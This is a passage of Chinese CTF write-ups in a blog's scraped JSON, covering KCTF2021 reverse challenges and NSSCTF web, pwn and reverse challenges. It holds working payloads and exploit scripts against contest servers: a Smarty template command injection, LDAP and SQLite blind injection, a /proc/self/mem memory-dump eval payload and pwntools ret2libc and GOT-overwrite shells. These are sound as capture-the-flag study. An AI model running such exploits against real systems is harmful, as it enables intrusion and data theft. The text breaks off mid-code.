*v4; // esi  unsigned char *v5; // ecx  int v6; // edi  unsigned char *v7; // ecx  int v8; // edx  unsigned char *v9; // eax  int v10; // ecx  int v11; // esi  int v12; // eax  unsigned char v13; // dl  int v14; // edi  int v15; // eax  int v16; // ecx  int v17; // esi  int i; // eax  char v19; // dl  unsigned char v21; // [esp+10h] [ebp-Ch]  unsigned char v22; // [esp+11h] [ebp-Bh]  unsigned char v23; // [esp+12h] [ebp-Ah]  unsigned char v24; // [esp+13h] [ebp-9h]  unsigned char *v25; // [esp+14h] [ebp-8h]  v21 = 0; v22 = 0; v23 = 0; v24 = 0; v2 = 1; v25 = byte_404420; for (i = 0; i \u0026lt; 8; i++) byte_404000[i] = a2[i]; do { byte_404220[0] = byte_404000[v2 - 1]; byte_404220[1] = v2; v3 = byte_404220; v4 = dword_404100; v5 = \u0026amp;byte_404220[dword_404100[0]]; do { v6 = *v4; // 2, 4, 8, 10h, 20h, 40h, 80h  if ( *v4 \u0026gt; 0 ) { do { v7 = v5 + 1; *(v7 - 1) = byte_404000[*v3]; *v7 = *v3 + 1; v5 = v7 + 1; ++v3; --v6; } while ( v6 ); } ++v4; } while ( v4 \u0026lt; \u0026amp;(dword_404100[7]) ); v8 = 256; do { ++v25[*v3++]; --v8; } while ( v8 ); ++v2; v25 += 256; } while ( v2 - 1 \u0026lt; 256 ); v9 = \u0026amp;byte_404420[0x28]; v10 = 256; do { if ( *(v9 - 40) ) ++v21; if ( *(v9 - 26) ) ++v22; if ( *v9 ) ++v23; if ( v9[39] ) ++v24; v9 += 256; --v10; } while ( v10 ); if ( v21 == 0xA9 \u0026amp;\u0026amp; v22 == 0xAC \u0026amp;\u0026amp; v23 == 0xA7 \u0026amp;\u0026amp; v24 \u0026gt; 0xC8u ){ for (i = 0; i \u0026lt; 8; i++){ printf(\u0026#34;%hhX\u0026#34;, a2[i]); } } return 0; } int main(){ unsigned char flag[] = {0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb}; do{ memset(byte_404420, 0, 65536); sub_401580(flag); }while (next_permutation(flag, flag + 8)); return 0; } 转换一下得到前八字节 B4D682C8BF2DE13A\n确定前八字节后，只需要关注和参数（后八字节）有关的部分了，中间全部动调跳过\n\r\n这一部分程序相较来说就简单了不少，主要是根据404000开头的八个字节作为初始值，每个字节单独与输入的八个字节进行运算，根据末尾bit决定是+1还是找索引，最终目的是凑成 GoodJob~ 这个字符串（sub_4024C0 是个字符串比较）\n可以使用搜索之类的，但考虑到每个字节是单独运算的，常规爆破也只需要 0x800 的运算量，所以还是直接爆破了\n#include \u0026lt;stdio.h\u0026gt; unsigned char byte_414420[] = {0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21}; unsigned char byte_404000[] = { 0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21, 0x74, 0xEB, 0x14, 0xBF, 0xDF, 0x25, 0x5A, 0x37, 0x85, 0x2C, 0xAF, 0x8C, 0xDA, 0x26, 0xE2, 0x7A, 0x87, 0x4C, 0x60, 0x99, 0x54, 0x3C, 0x95, 0xC0, 0xB9, 0x0C, 0xBC, 0x0E, 0xE7, 0x2D, 0x86, 0xBE, 0x67, 0xD3, 0xD8, 0xFC, 0x30, 0xB6, 0xC8, 0x57, 0x1E, 0x62, 0x3E, 0xCE, 0xA0, 0xCD, 0xF5, 0xEE, 0xA7, 0xCF, 0x45, 0xFE, 0xD0, 0x80, 0x05, 0xAD, 0x13, 0xF3, 0xB7, 0x6B, 0x22, 0x2B, 0xBD, 0x69, 0x42, 0x4B, 0xA5, 0xEA, 0xA6, 0xD2, 0x6F, 0x4F, 0x4E, 0x07, 0xE1, 0x36, 0x01, 0xB5, 0xAA, 0xB1, 0x94, 0x0B, 0x35, 0x3A, 0xC7, 0x49, 0x53, 0x82, 0xC3, 0x7B, 0x32, 0xFF, 0x19, 0xC4, 0xF1, 0xC9, 0xE8, 0xF7, 0x56, 0x15, 0xA3, 0x46, 0x89, 0x43, 0x9D, 0x8F, 0x20, 0xEF, 0xBB, 0x2A, 0xCB, 0x09, 0x93, 0x4A, 0x1C, 0xE3, 0x33, 0xD1, 0xE0, 0x1D, 0x72, 0x7C, 0x27, 0xE9, 0x17, 0x28, 0x6D, 0x6A, 0xD9, 0x00, 0x9A, 0xE5, 0x63, 0xDE, 0x23, 0x9F, 0x0D, 0x47, 0x3B, 0x65, 0x08, 0x84, 0x6C, 0x1A, 0x88, 0x12, 0xA1, 0xA4, 0xB3, 0x18, 0x24, 0x1B, 0xD7, 0x44, 0xDB, 0xAC, 0x6E, 0x7D, 0x51, 0x5E, 0xED, 0x50, 0xD6, 0x11, 0x5B, 0x9C, 0xB4, 0x68, 0x3D, 0x2F, 0x03, 0x40, 0xBA, 0x2E, 0xCA, 0x02, 0xE6, 0xA8, 0xEC, 0x83, 0x06, 0x5D, 0xB8, 0x4D, 0x97, 0x66, 0xF0, 0xFB, 0x8A, 0x55, 0xAB, 0xB2, 0x04, 0xFA, 0x0A, 0x31, 0x71, 0xCC, 0x8B, 0x73, 0xA9, 0x48, 0x5C, 0xF9, 0x98, 0xE4, 0xC6, 0x34, 0xC5, 0x7E, 0x81, 0x75, 0x90, 0x1F, 0x92, 0x3F, 0x9E, 0x10, 0x29, 0x52, 0x39, 0xF4, 0x41, 0x78, 0x5F, 0x16, 0x79, 0xC2, 0xB0, 0xDD, 0xF2, 0x61, 0x0F, 0x70, 0xD4, 0x91, 0xDC, 0xF6, 0xF8, 0xFD, 0x59, 0x38, 0x8D, 0x96, 0xAE, 0x8E, 0x76, 0xA2 }; int calc(unsigned char a2, int i){ int v17; // esi  char v19; // dl  v17 = 0; do { if ( v17 \u0026gt;= 8 ) { if ( !i || i == 7 ) --byte_414420[i]; } else { if ( (a2 \u0026amp; 1) != 0 ) v19 = byte_414420[i] + 1; else v19 = byte_404000[byte_414420[i]]; byte_414420[i] = v19; a2 \u0026gt;\u0026gt;= 1; } ++v17; } while ( v17 \u0026lt; 9 ); return byte_414420[i]; } int main(){ int i = 0; unsigned char a = 0; unsigned char b[] = \u0026#34;GoodJob~\u0026#34;; for (int j = 0; j \u0026lt; 8; j++){ for (i = 0; i \u0026lt; 0x100; i++){ a = i \u0026amp; 0xff; for (int k = 0; k \u0026lt; 8; k++){ byte_414420[k] = byte_404000[k]; } calc(a, j); if (byte_414420[j] == b[j]) printf(\u0026#34;%d %x\\n\u0026#34;, j, a); } } return 0; } 最后得到下半段验证码 D9B6AEF24A80CB22\n第七题 声名远扬  这题做完后懒了，没有交wp\n 初步分析了一下，看到一些字符串，发现这题用了 duilib 架构\n很多人的 wp 写的是用虚表找到验证函数，但我对虚表不太了解，做题的时候是用的动调下断点的方式做的\n动调的时候搜索字符串，发现能找到输入，然后在输入处下个硬件断点，能够断到 strlen，出来后还能看到 strncpy，但在这里断是不对的，因为没有点击检查，所以无论如何也进不了验证函数，于是朋友在获取消息的地方加了个消息断点，这时候再用硬件断点断下来，然后不断取消当前断点，在 strncpy 到的地方下新的断点，就能够进入到加密函数\n\r\n这个 base64 应该还是很容易看出来的，但动调拿结果能发现明显换表了，函数往里跟也不好跟，于是直接用动调拿结果\n这里构造了一个长度为 50 的输入，能够得到所有的 base64 字符\n输入：n++j'^aKgJ9*|an@@o$|8)9z#-;\u0026lt;\u0026lt;v789ghistu:/\u0026gt;^c?,/@YZ\n标准表下的输出：bisraideYUtnSjkqfGFuQEBvJHw4KTl6Iy07PDx2Nzg5Z2hpc3R1Oi8+XmM/LC9AWVo=\n这个输入就可以总结出这个题的 base 表了\nprvo9CHSJOcPIb6xRVUXQz0qBGDE72LNZduaefYT5K_8-4FAhlimjkngt1yMWs3w!\n接下来继续用动调找验证函数\n\r\n可以看到 v17 = xxx | 0x3300000000\n而最后的 call 是 MK_FP(WORD2(v17), v17)()\n结合着 32 位程序，猜测是一个天堂之门\n把调用的函数取出来，ida64 反编译一下\n\r\n这个函数大致猜测一下，显然是要求 v8 == v9[v28 - a1] 一直成立\n一开始的 do while 循环是对目标密文做了个解密，于是动调到验证的地方看一下内存\nGYldGg-iIoJlPX9hPXpjPqfdEY21B01TBTzeGqfKNR!!\n前面已经知道了 ! 就是这里 base64 的填充，于是这个字符串就是密文了\n换表 base64 的解密\n把表换回来之后的密文：\nZmxhZ3syMDIxLTEwLTA0LXlhbmd5YW5nYnVkZXlpfQ==\n明显的 flag 标志 Zmxh\n","date":"2021-12-23T22:23:17+08:00","image":"https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/cover_hufd6827b5e92508a15177056d76ff05d4_2462797_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/","title":"KCTF2021 Fall Writeup by or4nge"},{"content":"* 开头题目表示赛后补题\nWeb [签到]flag 等一个一个拼出来，业余web手的笨B做题法\n[萌]odd_upload 题目描述：目录结构与官方项目example相同\n所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system('cat /flag')}，之后再重新访问题目链接就能获取flag。\n\r\nflag{1ae85554-c785-4321-8d77-0f68974929f8}\neasyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示\nThe flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_\n说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？\n按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有'(\u0026lsquo;或者\u0026rsquo;)\u0026lsquo;就会报错：\nWarning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48\rWarning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49\r有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：\nimport requests url = \u0026#34;http://47.106.172.144:2333/\u0026#34; alphabet = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39; def search(flag): for c in alphabet: # print(flag+c+\u0026#39;*\u0026#39;) r = requests.get(url, params={\u0026#39;user\u0026#39;:flag+c+\u0026#39;*\u0026#39;, \u0026#39;pass\u0026#39;:\u0026#39;1\u0026#39;}) if \u0026#39;找不到用户\u0026#39; in r.text: pass elif \u0026#39;查询用户不唯一\u0026#39; in r.text or \u0026#39;密码错误\u0026#39; in r.text: # print(c+\u0026#39;\\n\u0026#39;+r.text) print(flag+c) search(flag+c) else: print(\u0026#39;Error: [\u0026#39;+c+\u0026#39;]\\n\u0026#39;+r.text) search(\u0026#39;\u0026#39;) *hideandseek 和web没有啥关系，和二进制全是关系。\n先附上打本地的DockerFile:\nFROMphp:8.1.0ADD ./src /var/www/htmlADD ./flag /flagWORKDIR/var/www/html/RUN chmod -R 0555 /var/www/html/CMD [\u0026#34;php\u0026#34;, \u0026#34;-S\u0026#34;, \u0026#34;0.0.0.0:8000\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;/var/www/html\u0026#34;]这题上先读flag，然后把flag给覆盖了，你只有一次执行任意代码的机会。\n思路上来一下子就指向了/proc，进程目录，我们肯定是能通过分析这个进程把flag拿到了。目前已知的/proc的博客有：\n https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/\nhttps://xz.aliyun.com/t/10579\n 第一反应是读fd，看看文件的符号链接，如果fopen了，但没fclose就有可能在fd里找到，本地一试发现没有。\n于是考虑利用别的，比如./exe，是一个ELF文件，但可惜strings ./exe没用，因为flag变量是在运行时读取的，生成elf是不存在这个字符串的，于是就读./mem，/proc/{PID}/mem是可用于访问进程的内存的页面。但是发现读取失败了，报错如下：\ncat mem: Input/output error\r搜到了解释原因：https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux\n/proc/$pid/mem显示$pid 内存的内容与进程中的映射方式相同，即伪文件中偏移x处的字节与进程中地址x处的字节相同。如果在进程中未映射地址，则从文件中的相应偏移量读取返回EIO（输入/输出错误）。例如，由于进程中的第一页永远不会被映射（因此取消引用NULL指针会完全失败，而不是无意中访问实际内存），因此读取 的第一个字节/proc/$pid/mem总是会产生 I/O 错误。\n同时也拿到了一份用python拿内存信息的脚本：\nimport re maps_file = open(\u0026#34;/proc/self/maps\u0026#34;, \u0026#39;r\u0026#39;) mem_file = open(\u0026#34;/proc/self/mem\u0026#34;, \u0026#39;rb\u0026#39;, 0) output_file = open(\u0026#34;self.dump\u0026#34;, \u0026#39;wb\u0026#39;) for line in maps_file.readlines(): # for each mapped region m = re.match(r\u0026#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])\u0026#39;, line) if m.group(3) == \u0026#39;r\u0026#39;: # if this is a readable region start = int(m.group(1), 16) end = int(m.group(2), 16) mem_file.seek(start) # seek to region start chunk = mem_file.read(end - start) # read region contents output_file.write(chunk) # dump contents to standard output maps_file.close() mem_file.close() output_file.close() 我盲猜flag就在内存里，但我也不是打二进制的，也不知道在哪，于是就打算把整个chunk全部正则匹配即可。\n把上述代码翻译成php，修改部分内容如下：\n\u0026lt;?php $maps_file = fopen(\u0026#34;/proc/self/maps\u0026#34;, \u0026#34;r\u0026#34;); $mem_file = fopen(\u0026#34;/proc/self/mem\u0026#34;, \u0026#34;rb\u0026#34;); while(! feof($maps_file)) { $line = fgets($maps_file);//fgets()函数从文件指针中读取一行  $m = preg_match(\u0026#34;/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/\u0026#34;, $line, $match); if($match[3] == \u0026#39;r\u0026#39;) { $start = hexdec($match[1]); $end = hexdec($match[2]); fseek($mem_file, $start); $chunk = fread($mem_file, $end - $start); if(preg_match(\u0026#34;/flag\\{.*\\}/\u0026#34;, $chunk)) { preg_match(\u0026#34;/(flag\\{.*\\})/\u0026#34;, $chunk, $ans); var_dump($ans); } } } fclose($maps_file); fclose($mem_file); ?\u0026gt;最后用base64+urlencode传参（有了安洵杯的教训，base64一定要编码），最终payload如下：\nhttp://5b599005-3dfe-44e4-ac13-96fc3b194f3e.nssctf.neusoft.edu.cn/?eval=eval(base64_decode(%22JG1hcHNfZmlsZSA9IGZvcGVuKCIvcHJvYy9zZWxmL21hcHMiLCAiciIpOwokbWVtX2ZpbGUgPSBmb3BlbigiL3Byb2Mvc2VsZi9tZW0iLCAicmIiKTsKd2hpbGUoISBmZW9mKCRtYXBzX2ZpbGUpKSB7CiAgICAgICAgJGxpbmUgPSBmZ2V0cygkbWFwc19maWxlKTsvL2ZnZXRzKCnlh73mlbDku47mlofku7bmjIfpkojkuK3or7vlj5bkuIDooYwKICAgICAgICAgICAgJG0gPSBwcmVnX21hdGNoKCIvKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pLyIsICRsaW5lLCAkbWF0Y2gpOwogICAgICAgICAgICBpZigkbWF0Y2hbM10gPT0gJ3InKSB7CiAgICAgICAgICAgICAgICAgICAgJHN0YXJ0ID0gaGV4ZGVjKCRtYXRjaFsxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRlbmQgPSBoZXhkZWMoJG1hdGNoWzJdKTsKICAgICAgICAgICAgICAgICAgICAgICAgZnNlZWsoJG1lbV9maWxlLCAkc3RhcnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNodW5rID0gZnJlYWQoJG1lbV9maWxlLCAkZW5kIC0gJHN0YXJ0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi9mbGFnXHsuKlx9LyIsICRjaHVuaykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goIi8oZmxhZ1x7LipcfSkvIiwgJGNodW5rLCAkYW5zKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyX2R1bXAoJGFucyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KfQpmY2xvc2UoJG1hcHNfZmlsZSk7CmZjbG9zZSgkbWVtX2ZpbGUpOw%3D%3D%22));\r*wschat 前后端交互用的是socket io，参数格式用的是protobuf，前端的js加了很多混淆和反调试。可以在这个网站https://lelinhtinh.github.io/de4js/做个简单的恢复后再看。\n贴一下我恢复后的还算是能看的关键代码：\n\u0026lt;html\u0026gt; ... \u0026lt;script src=\u0026#34;//cdn.bootcss.com/socket.io/2.1.1/socket.io.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;protobuf.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; ... let sock = io.connect(\u0026#39;ws://\u0026#39; + window.location.host + \u0026#39;/\u0026#39;); var WSMessage, wsmessage, buffer; protobuf.load(\u0026#39;chat.proto\u0026#39;, function (err, _0x75e501) { if (err) throw err; LoginReq = _0x75e501.lookup(\u0026#39;wschat.chat.LoginReq\u0026#39;), RegReq = _0x75e501.lookup(\u0026#39;wschat.chat.RegReq\u0026#39;), ServerRsp = _0x75e501.lookup(\u0026#39;wschat.chat.ServerRsp\u0026#39;), MsgReq = _0x75e501.lookup(\u0026#39;wschat.chat.MsgReq\u0026#39;), LogoutReq = _0x75e501.lookup(\u0026#39;wschat.chat.LogoutReq\u0026#39;); }), window.onload = function () { let _0x1f4215 = \u0026#39;\u0026#39;, btn1 = document.getElementById(\u0026#39;btn1\u0026#39;), btn2 = document.getElementById(\u0026#39;btn2\u0026#39;), btn_send = document.getElementById(\u0026#39;btn_send\u0026#39;), user = document.getElementById(\u0026#39;user\u0026#39;), pass = document.getElementById(\u0026#39;pass\u0026#39;), txt1 = document.getElementById(\u0026#39;txt1\u0026#39;), ul1 = document.getElementById(\u0026#39;ul1\u0026#39;); btn1.onclick = function () { var _0x3689c9 = RegReq.create({ \u0026#39;username\u0026#39;: user.value, \u0026#39;password\u0026#39;: pass.value }), _0x38c60d = RegReq.encode(_0x3689c9).finish(); sock.emit(\u0026#39;reg\u0026#39;, _0x38c60d.slice().buffer); }, sock.on(\u0026#39;reg_ret\u0026#39;, (_0x77442, _0x4d8078) =\u0026gt; { _0x77442 ? alert(_0x4d8078) : alert(_0x4d8078); }), btn2.onclick = function () { if (!/^\\w{1,16}$/ [\u0026#39;test\u0026#39;](user.value)) { alert(\u0026#39;用户名不符合规范\u0026#39;); return; } if (!/^\\w{1,16}$/ [\u0026#39;test\u0026#39;](pass.value)) { alert(\u0026#39;密码不符合规范\u0026#39;); return; } var _0xea8ad4 = LoginReq.create({ \u0026#39;username\u0026#39;: user.value, \u0026#39;password\u0026#39;: pass.value }), _0x581e63 = LoginReq.encode(_0xea8ad4).finish(); sock.emit(\u0026#39;login\u0026#39;, _0x581e63.slice().buffer); }, sock.on(\u0026#39;login_ret\u0026#39;, (_0x253784, _0x4ca143) =\u0026gt; { _0x253784 ? alert(_0x4ca143) : (_0x1f4215 = user.value, alert(_0x4ca143)); }), btn_send.onclick = function () { var _0x254c70 = MsgReq.create({ \u0026#39;msg\u0026#39;: txt1.value }), _0x56ebdb = MsgReq.encode(_0x254c70).finish(); sock.emit(\u0026#39;msg\u0026#39;, _0x56ebdb.slice().buffer); }, sock.on(\u0026#39;msg\u0026#39;, (_0x2378cb, _0x4ce8f4) =\u0026gt; { let _0x3ca130 = document.createElement(\u0026#39;li\u0026#39;); _0x3ca130.innerHTML = \u0026#39;\u0026lt;h3\u0026gt;\u0026#39; + _0x2378cb + \u0026#39;\u0026lt;/h3\u0026gt;\u0026lt;p\u0026gt;\u0026#39; + _0x4ce8f4 + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;, ul1.appendChild(_0x3ca130); }), sock.on(\u0026#39;msg_ret\u0026#39;, (_0x491ba1, _0x25dec1) =\u0026gt; { if (_0x491ba1) alert(\u0026#39;发送失败：\u0026#39; + _0x25dec1); else { let _0x4a7033 = document.createElement(\u0026#39;li\u0026#39;); _0x4a7033.className = \u0026#39;mine\u0026#39;, _0x4a7033.innerHTML = \u0026#39;\u0026lt;h3\u0026gt;\u0026#39; + _0x1f4215 + \u0026#39;\u0026lt;/h3\u0026gt;\u0026lt;p\u0026gt;\u0026#39; + txt1.value + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;, ul1.appendChild(_0x4a7033), txt1.value = \u0026#39;\u0026#39;; } }); }, setInterval(function () { _0x6c017f(); }, 4000); ... \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; 这段代码引入了socket io和protobuf，socket io有reg、reg_ret、login、login_ret、msg、msg_ret事件，传递的参数均使用protobuf打包，看一下protobuf定义文件chat.proto：\npackage wschat;\rmessage chat {\rmessage LoginReq {\rrequired string username = 1;\rrequired string password = 2;\r}\rmessage RegReq {\rrequired string username = 1;\rrequired string password = 2;\r}\rmessage ServerRsp {\rrequired int32 retcode = 1;\roptional string reply = 2;\r}\rmessage MsgReq {\rrequired string msg = 1;\r}\rmessage LogoutReq {\r}\r}\r回到上面的代码，其中登录接口是前端校验，限制用户名密码只能为1-16位字母数字下划线，前端校验可以用burp替换为空。\n题目中提示网站为nodejs + sqlite，尝试一下sqlite注入，首先注册一个用户名密码均为admin的账户，然后用户名输入admin\u0026rsquo;，密码admin，提示数据库出错，用户名尝试admin'\u0026ndash;，提示登录成功，存在注入点。\n由于是盲注，socket io实现又很慢，只能硬撸出一个脚本。参考 https://developers.google.com/protocol-buffers/docs/pythontutorial 实现protobuf，参考 https://python-socketio.readthedocs.io/en/latest/ 实现socket io。\n在 https://developers.google.com/protocol-buffers/docs/downloads 下载protoc，然后把.proto文件编译成python文件：\nprotoc -I=chat.proto目录 --python_out=输出目录 chat.proto路径\r然后运行脚本：\nimport socketio import time import string import chat_pb2 url = \u0026#39;http://4b89d5d3-7df8-4a8c-9352-08dbc410f835.nssctf.neusoft.edu.cn/\u0026#39; sio = socketio.Client() LoginReq = chat_pb2.chat.LoginReq() RegReq = chat_pb2.chat.RegReq() ServerRsp = chat_pb2.chat.ServerRsp() MsgReq = chat_pb2.chat.MsgReq() LogoutReq = chat_pb2.chat.LogoutReq() # alphabet = string.ascii_letters + string.digits + \u0026#39;{_.,}\u0026#39; # alphabet = string.printable + string.whitespace alphabet = string.ascii_lowercase + string.digits @sio.event def reg_ret(err, data): global _err, _data, recvFlag # print(err, data) _err = err _data = data recvFlag = True @sio.event def login_ret(err, data): global _err, _data, recvFlag # print(err, data) _err = err _data = data recvFlag = True @sio.event def msg(title, content): print(title, content) @sio.event def msg_ret(err, data): print(err, data) @sio.event def connect(): print(\u0026#39;connection established\u0026#39;) @sio.event def disconnect(): print(\u0026#39;disconnected from server\u0026#39;) def register(username=\u0026#39;admin\u0026#39;, password=\u0026#39;admin\u0026#39;): RegReq.username = username RegReq.password = password sio.emit(\u0026#39;reg\u0026#39;, RegReq.SerializeToString()) while not recvFlag: pass err, data = _err, _data init() return err, data def login(username=\u0026#39;admin\u0026#39;, password=\u0026#39;admin\u0026#39;): LoginReq.username = username LoginReq.password = password sio.emit(\u0026#39;login\u0026#39;, LoginReq.SerializeToString()) while not recvFlag: pass err, data = _err, _data init() return err, data def init(): global recvFlag, _err, _data recvFlag = False _err = None _data = None if __name__ == \u0026#39;__main__\u0026#39;: sio.connect(url) init() register() # payload = \u0026#34;select group_concat(tbl_name) from sqlite_master where type=\u0026#39;table\u0026#39;\u0026#34; # payload = \u0026#34;select sql from sqlite_master where type=\u0026#39;table\u0026#39; and tbl_name=\u0026#39;f16g_1s_1n_th1s_table\u0026#39;\u0026#34; payload = \u0026#34;select group_concat(f16g) from f16g_1s_1n_th1s_table\u0026#34; length = 0 for i in range(1, 100): err, data = login(\u0026#34;admin\u0026#39; and length((%s))=%d--\u0026#34;%(payload, i)) # print(err, data) if err == 1: pass elif err == 0: length = i break else: print(\u0026#39;Error!\u0026#39;, err, data) print(\u0026#39;Length:\u0026#39;, length) # length = 6 flag = \u0026#39;\u0026#39; for i in range(1, length+1): found = False for c in alphabet: err, data = login(\u0026#34;admin\u0026#39; and hex(substr((%s),%d,1))=\u0026#39;%s\u0026#39;--\u0026#34;%(payload, i, c.encode().hex())) # print(flag+c, err, data) if err == 1: pass elif err == 0: found = True flag += c print(flag) break else: print(\u0026#39;Error!\u0026#39;, err, data) if not found: flag += \u0026#39;\\0\u0026#39; # version: 3.34.0 # table: user_table,sqlite_sequence,f1ag_not_in_here,test_table,f16g_1s_1n_th1s_table # column: \u0026#34;f16g\u0026#34; TEXT # f ag 34e7472f ffcf 400d aec3 a3b4fe390c1d  # flag{34e7472f-ffcf-400d-aec3-a3b4fe390c1d} sio.disconnect() 吐槽一下，socket io是基于事件触发的，有点类似于智能合约，请求与响应没有严格的对应关系，只能把请求和响应封装成一个原子操作，模拟传统的HTTP请求，代价就是速度很慢很慢。sql注入部分就是常见的sqlite注入了，但是爆flag的时候不知道为什么有的位即使把0-255跑遍也跑不出来，猜测可能是使用了中文，一个字符不只一个字节，这种情况下的爆破时间过长，所以在脚本中如果常用字符找不到就用\\0占位，缺失的字符按照uuid的格式猜就行了。\nflag{34e7472f-ffcf-400d-aec3-a3b4fe390c1d}\rPwn [签到]NssShop 随便输了个数\n\r\njustdoit 有一个汇编在调用read_long函数的最后，配合上atol可以任意往上往下更改栈的位置，利用这一点在栈上构造rop用ret2libc拿shell\nadd rbp rax\r以下是exp\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./justdoit.1\u0026#34;) p = remote(\u0026#34;47.106.172.144\u0026#34;, 65004) elf = ELF(\u0026#34;./justdoit.1\u0026#34;) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) pop_rdi = 0x00000000004012b3 main = 0x4011D5 p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(main)+ p64(main) + p64(main)) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-24\u0026#34;) p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(pop_rdi) + p64(elf.got[\u0026#34;puts\u0026#34;]) + p64(elf.plt[\u0026#34;puts\u0026#34;])) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-40\u0026#34;) libc.address = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#34;puts\u0026#34;] print(hex(libc.address)) p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(pop_rdi) + p64(libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__()) + p64(libc.sym[\u0026#39;system\u0026#39;])) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-40\u0026#34;) p.interactive() \r\nreallNeedGoodLuck 任意地址四字节写， 改error的got表为main，改atoi的got表为system，撞上的几率很大，直接手动爆破就行\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) p=remote(\u0026#34;47.106.172.144\u0026#34;, 65003) # p = process(\u0026#34;./reallNeedGoodLuck.1\u0026#34;) # gdb.attach(p) p.recvuntil(\u0026#34;good\u0026#34;) p.send(b\u0026#34;\\xa9\\x11\\x40\\x00\u0026#34;) p.recvuntil(\u0026#34;luck!\u0026#34;) p.sendline(b\u0026#34;4210744\u0026#34;) p.recvuntil(\u0026#34;good\u0026#34;) p.send(b\u0026#34;\\x00\\x00\\xa0\\xf3\u0026#34;) p.recvuntil(\u0026#34;luck!\u0026#34;) p.sendline(b\u0026#34;4210734\u0026#34;) print(hex(libc.sym[\u0026#34;system\u0026#34;])) p.send(b\u0026#34;\\x00\\x00\\x00\\x00\u0026#34;) p.sendline(b\u0026#34;/bin/sh\\x00\u0026#34;) p.send(b\u0026#34;\\x00\\x00\\x00\\x00\u0026#34;) p.sendline(b\u0026#34;/bin/sh\\x00\u0026#34;) p.interactive() \r\nReverse [签到]Signin \r\n[萌新]happyCTF s = \u0026#39;rxusoCqxw{yqK`{KZqag{r`i\u0026#39; for i in s: print(chr(ord(i)^0x14),end=\u0026#39;\u0026#39;) #flag{Welcome_to_Neusoft} Remember Crypt 4 rc4加密，根据密钥解密即可\ndef __rc4_init(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] return S def rc4_crypt(key, data): S = __rc4_init(key) i = j = 0 result = b\u0026#39;\u0026#39; for a in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = (a ^ S[(S[i] + S[j]) % 256]).to_bytes(1, \u0026#39;big\u0026#39;) result += k return result l = [0x9E, 0xE7, 0x30, 0x5F, 0xA7, 0x01, 0xA6, 0x53, 0x59, 0x1B, 0x0A, 0x20, 0xF1, 0x73, 0xD1, 0x0E, 0xAB, 0x09, 0x84, 0x0E, 0x8D, 0x2B] n = [] for i in l: n.append(i^0x22) from libnum import n2s, s2n def convert(k): ret = [] while k \u0026gt; 0: ret.append(k \u0026amp; 0xff) k \u0026gt;\u0026gt;= 8 return ret[::-1] print(rc4_crypt(convert(s2n(\u0026#39;12345678abcdefghijklmnopqrspxyz\u0026#39;)),n)) #flag{nice_to_meet_you} EasyRe 用信号量实现的VM，先手动反汇编\ncode = [ 17, 52, 0, 42, 5, 16, 